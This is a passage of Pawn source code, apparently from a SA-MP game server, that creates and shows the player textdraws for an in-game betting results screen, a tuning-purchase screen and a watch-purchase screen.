		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 6 ], 1);

		KladionicaSM[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 480.625000, 187.000030, "1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.50 3.00~n~1.40 2.5");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 7 ], 0.249374, 0.940831);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 7 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 7 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 7 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 7 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 7 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 7 ], 1);

		KladionicaSM[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 109.500000, 196.249954, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 8 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 8 ], 413.125000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 8 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 8 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 8 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 8 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 8 ], 4);

		KladionicaSM[ playerid ][ 9 ] = CreatePlayerTextDraw(playerid, 109.250000, 204.249938, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 9 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 9 ], 413.750000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 9 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 9 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 9 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 9 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 9 ], 4);

		KladionicaSM[ playerid ][ 10 ] = CreatePlayerTextDraw(playerid, 109.625000, 212.833236, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 10 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 10 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 10 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 10 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 10 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 10 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 10 ], 4);

		KladionicaSM[ playerid ][ 11 ] = CreatePlayerTextDraw(playerid, 110.625000, 221.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 11 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 11 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 11 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 11 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 11 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 11 ], 4);

		KladionicaSM[ playerid ][ 12 ] = CreatePlayerTextDraw(playerid, 109.750000, 229.999908, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 12 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 12 ], 413.750000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 12 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 12 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 12 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 12 ], 4);

		KladionicaSM[ playerid ][ 13 ] = CreatePlayerTextDraw(playerid, 109.500000, 238.583175, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 13 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 13 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 13 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 13 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 13 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 13 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 13 ], 4);

		KladionicaSM[ playerid ][ 14 ] = CreatePlayerTextDraw(playerid, 110.500000, 245.999816, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 14 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 14 ], 413.125000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 14 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 14 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 14 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 14 ], 4);

		KladionicaSM[ playerid ][ 15 ] = CreatePlayerTextDraw(playerid, 236.625000, 171.916595, "Domacin");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 15 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 15 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 15 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 15 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 15 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 15 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 15 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 15 ], 1);

		KladionicaSM[ playerid ][ 16 ] = CreatePlayerTextDraw(playerid, 109.000000, 254.583099, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 16 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 16 ], 414.375000, -0.583323);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 16 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 16 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 16 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 16 ], 4);

		KladionicaSM[ playerid ][ 17 ] = CreatePlayerTextDraw(playerid, 110.625000, 263.166473, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 17 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 17 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 17 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 17 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 17 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 17 ], 4);

		KladionicaSM[ playerid ][ 18 ] = CreatePlayerTextDraw(playerid, 111.000000, 272.333190, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 18 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 18 ], 412.500000, 0.583343);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 18 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 18 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 18 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 18 ], 4);

		KladionicaSM[ playerid ][ 19 ] = CreatePlayerTextDraw(playerid, 362.000000, 171.166625, "GOst");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 19 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 19 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 19 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 19 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 19 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 19 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 19 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 19 ], 1);

		KladionicaSM[ playerid ][ 20 ] = CreatePlayerTextDraw(playerid, 453.000000, 171.583297, "Rezultat");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 20 ], 0.271249, 0.969998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 20 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 20 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 20 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 20 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 20 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 20 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 20 ], 1);

		KladionicaSM[ playerid ][ 21 ] = CreatePlayerTextDraw(playerid, 206.000000, 147.416580, "Valhalla Kladionica");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 21 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 21 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 21 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 21 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 21 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 21 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 21 ], 1);

		KladionicaSM[ playerid ][ 22 ] = CreatePlayerTextDraw(playerid, 472.625000, 297.749969, "BE");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 22 ], 0.751250, 1.529998);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 22 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 22 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 22 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 22 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 22 ], 0);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 22 ], 1);

		KladionicaSM[ playerid ][ 23 ] = CreatePlayerTextDraw(playerid, 154.125000, 309.916778, "www.valhalla-ogc.com");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 23 ], 0.228749, 0.719165);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 23 ], SRVBOJA1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 23 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 23 ], 1);
		PlayerTextDrawBackgroundColor(playerid, KladionicaSM[ playerid ][ 23 ], 51);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 23 ], 2);
		PlayerTextDrawSetProportional(playerid, KladionicaSM[ playerid ][ 23 ], 1);

		KladionicaSM[ playerid ][ 24 ] = CreatePlayerTextDraw(playerid, 208.125000, 168.583343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 24 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 24 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 24 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 24 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 24 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 24 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 24 ], 4);

		KladionicaSM[ playerid ][ 25 ] = CreatePlayerTextDraw(playerid, 322.875000, 167.833328, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 25 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 25 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 25 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 25 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 25 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 25 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 25 ], 4);

		KladionicaSM[ playerid ][ 26 ] = CreatePlayerTextDraw(playerid, 439.500000, 167.083343, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 26 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 26 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 26 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 26 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 26 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 26 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 26 ], 4);

		KladionicaSM[ playerid ][ 29 ] = CreatePlayerTextDraw(playerid, 517.750000, 168.500015, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 29 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 29 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 29 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 29 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 29 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 29 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 29 ], 4);

		KladionicaSM[ playerid ][ 30 ] = CreatePlayerTextDraw(playerid, 113.750000, 167.749984, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, KladionicaSM[ playerid ][ 30 ], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, KladionicaSM[ playerid ][ 30 ], 0.625000, 104.416656);
		PlayerTextDrawAlignment(playerid, KladionicaSM[ playerid ][ 30 ], 1);
		PlayerTextDrawColor(playerid, KladionicaSM[ playerid ][ 30 ], -1);
		PlayerTextDrawSetShadow(playerid, KladionicaSM[ playerid ][ 30 ], 0);
		PlayerTextDrawSetOutline(playerid, KladionicaSM[ playerid ][ 30 ], 0);
		PlayerTextDrawFont(playerid, KladionicaSM[ playerid ][ 30 ], 4);

		new str[ 256 ];

		format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			bettingInfo[ StariParovi[ 0 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 1 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 2 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 3 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 4 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 5 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 6 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 7 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 8 ][ parID ][ 0 ] ][ teamName ],
			bettingInfo[ StariParovi[ 9 ][ parID ][ 0 ] ][ teamName ] );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 4 ], str );

	 	format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			bettingInfo[ StariParovi[ 0 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 1 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 2 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 3 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 4 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 5 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 6 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 7 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 8 ][ parID ][ 1 ] ][ teamName ],
			bettingInfo[ StariParovi[ 9 ][ parID ][ 1 ] ][ teamName ] );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 6 ], str );

	 	format( str, sizeof( str ), "%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d~n~%d:%d",
			StariParovi[ 0 ][ Rezultat ][ 0 ], StariParovi[ 0 ][ Rezultat ][ 1 ],
			StariParovi[ 1 ][ Rezultat ][ 0 ], StariParovi[ 1 ][ Rezultat ][ 1 ],
			StariParovi[ 2 ][ Rezultat ][ 0 ], StariParovi[ 2 ][ Rezultat ][ 1 ],
			StariParovi[ 3 ][ Rezultat ][ 0 ], StariParovi[ 3 ][ Rezultat ][ 1 ],
			StariParovi[ 4 ][ Rezultat ][ 0 ], StariParovi[ 4 ][ Rezultat ][ 1 ],
			StariParovi[ 5 ][ Rezultat ][ 0 ], StariParovi[ 5 ][ Rezultat ][ 1 ],
			StariParovi[ 6 ][ Rezultat ][ 0 ], StariParovi[ 6 ][ Rezultat ][ 1 ],
			StariParovi[ 7 ][ Rezultat ][ 0 ], StariParovi[ 7 ][ Rezultat ][ 1 ],
			StariParovi[ 8 ][ Rezultat ][ 0 ], StariParovi[ 8 ][ Rezultat ][ 1 ],
			StariParovi[ 9 ][ Rezultat ][ 0 ], StariParovi[ 9 ][ Rezultat ][ 1 ]
            
		);

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 7 ], str );

		new hour, minute, second, day, year, month;
		getdate( year, month, day );
		gettimeEx( hour, minute, second );
		FixHour( hour );
		hour = shifthour;

		format( str, sizeof( str ), "%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s~n~%s",
			StariParovi[ 0 ][ HourPobeda ],
			StariParovi[ 1 ][ HourPobeda ],
			StariParovi[ 2 ][ HourPobeda ],
			StariParovi[ 3 ][ HourPobeda ],
			StariParovi[ 4 ][ HourPobeda ],
			StariParovi[ 5 ][ HourPobeda ],
			StariParovi[ 6 ][ HourPobeda ],
			StariParovi[ 7 ][ HourPobeda ],
			StariParovi[ 8 ][ HourPobeda ],
			StariParovi[ 9 ][ HourPobeda ] );

	 	PlayerTextDrawSetString( playerid, KladionicaSM[ playerid ][ 5 ], str );

		for( new i = 0; i < 31; i ++ ) {

			PlayerTextDrawShow( playerid, KladionicaSM[ playerid ][ i ] );
		}

		RezultatiPrikazana[ playerid ] = true;

	}
	else if( show == false ) {

		for( new i = 0; i < 31; i ++) {

		    PlayerTextDrawHide( playerid, KladionicaSM[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, KladionicaSM[ playerid ][ i ] );
			KladionicaSM[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		RezultatiPrikazana[ playerid ] = false;
	}
}

stock TuningTDShow( playerid, bool:show ) {

	if( show == true ) {
        for( new i = 0; i < 14; i ++ ) {
			PlayerTextDrawShow( playerid, TuningBuy[ playerid ][ i ] );
		}

	}
	else if( show == false ) {
		for( new i = 0; i < 14; i ++ ) {
			PlayerTextDrawHide( playerid, TuningBuy[ playerid ][ i ]);
		}
	}
}

//------------------------------------------------------------------------------

stock buyWatchTDControl( playerid, bool:show ) {

	if( show == true ) {
	    buyWatch[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid,410.000000, 170.000000, "  ");
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 0 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 0 ], 1);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 0 ], 0.500000, 12.399997);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 0 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 0 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 0 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 0 ], 1);
		PlayerTextDrawUseBox(playerid,buyWatch[ playerid ][ 0 ], 1);
		PlayerTextDrawBoxColor(playerid,buyWatch[ playerid ][ 0 ], 100);
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 0 ], 230.000000, 0.000000);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 0 ], 0);

		buyWatch[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid,230.000000, 165.000000, "  ");
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 1 ], 0 );
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 1 ], 5);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 1 ], 0.500000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 1 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 1 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 1 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 1 ], 1);
		PlayerTextDrawUseBox(playerid,buyWatch[ playerid ][ 1 ], 1);
		PlayerTextDrawBoxColor(playerid,buyWatch[ playerid ][ 1 ], 255);
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 1 ], 180.000000, 100.000000);
		PlayerTextDrawSetPreviewModel(playerid, buyWatch[ playerid ][ 1 ], 19039);
		PlayerTextDrawSetPreviewRot(playerid, buyWatch[ playerid ][ 1 ], 0.000000, 90.000000, 10.000000, 1.000000);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 1 ], 0);

		buyWatch[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid,319.000000, 256.000000, "Rolex Datejust - 521$");
		PlayerTextDrawAlignment(playerid,buyWatch[ playerid ][ 2 ], 2);
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 2 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 2 ], 2);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 2 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 2 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 2 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 2 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 2 ], 1);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 2 ], 0);

		buyWatch[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid,319.000000, 269.000000, "kupi_sat");
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 3 ], 40.000000, 20.000000);
		PlayerTextDrawAlignment(playerid,buyWatch[ playerid ][ 3 ], 2);
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 3 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 3 ], 2);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 3 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 3 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 3 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 3 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 3 ], 1);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 3 ], 1);

		buyWatch[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid,382.000000, 270.000000, "ld_beat:right");
		PlayerTextDrawAlignment(playerid,buyWatch[ playerid ][ 4 ], 2);
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 4 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 4 ], 4);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 4 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 4 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 4 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 4 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 4 ], 1);
		PlayerTextDrawUseBox(playerid,buyWatch[ playerid ][ 4 ], 1);
		PlayerTextDrawBoxColor(playerid,buyWatch[ playerid ][ 4 ], 255);
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 4 ], 20.000000, 10.000000);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 4 ], 1);

		buyWatch[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid,236.000000, 270.000000, "ld_beat:left");
		PlayerTextDrawAlignment(playerid,buyWatch[ playerid ][ 5 ], 2);
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 5 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 5 ], 4);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 5 ], 0.300000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 5 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 5 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 5 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 5 ], 1);
		PlayerTextDrawUseBox(playerid,buyWatch[ playerid ][ 5 ], 1);
		PlayerTextDrawBoxColor(playerid,buyWatch[ playerid ][ 5 ], 255);
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 5 ], 20.000000, 10.000000);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 5 ], 1);

		buyWatch[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid,316.000000, 264.000000, "-");
		PlayerTextDrawAlignment(playerid,buyWatch[ playerid ][ 6 ], 2);
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 6 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 6 ], 2);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 6 ], 13.700016, 0.499999);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 6 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 6 ], 0);
